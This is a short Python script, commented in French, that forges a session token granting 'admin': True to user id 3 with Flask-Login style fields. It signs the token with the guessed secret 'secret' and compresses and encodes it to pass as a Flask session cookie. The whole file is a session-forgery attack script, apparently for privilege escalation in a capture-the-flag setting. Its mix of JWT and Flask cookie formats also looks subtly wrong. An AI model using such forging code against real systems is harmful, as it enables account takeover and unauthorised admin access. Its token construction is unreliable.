import base64
import json
import zlib
import hmac
import hashlib

# 1. Préparer le JWT (header + payload)
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "admin": True,
    "_fresh": True,
    "_id": "17abc9007c380246da3d4dc3b848a4242b57cc49ae0945255bdbbc13e389b59fcb8bd88ac9a74f83f76f2b57345f40621d62e5988ea0ae2c8ff4c899a43814c3",
    "_user_id": "3"
}
secret = b"secret"  # clé secrète pour signer

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

# Encodage header/payload
header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# Signature
message = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(secret, message, hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)

# JWT brut
jwt = f"{header_b64}.{payload_b64}.{signature_b64}"

# 2. Compression zlib avec wrapper (comme Flask/Django)
compressed = zlib.compress(jwt.encode())

# 3. Encodage base64url (sans padding) pour usage web
encoded = base64.urlsafe_b64encode(compressed).decode().rstrip("=")

# 4. Facultatif : ajout du point initial (comme dans Flask `.eJ...`)
final_token = f".{encoded}"

print("✅ Token zlib + base64url JWT :")
print(final_token)
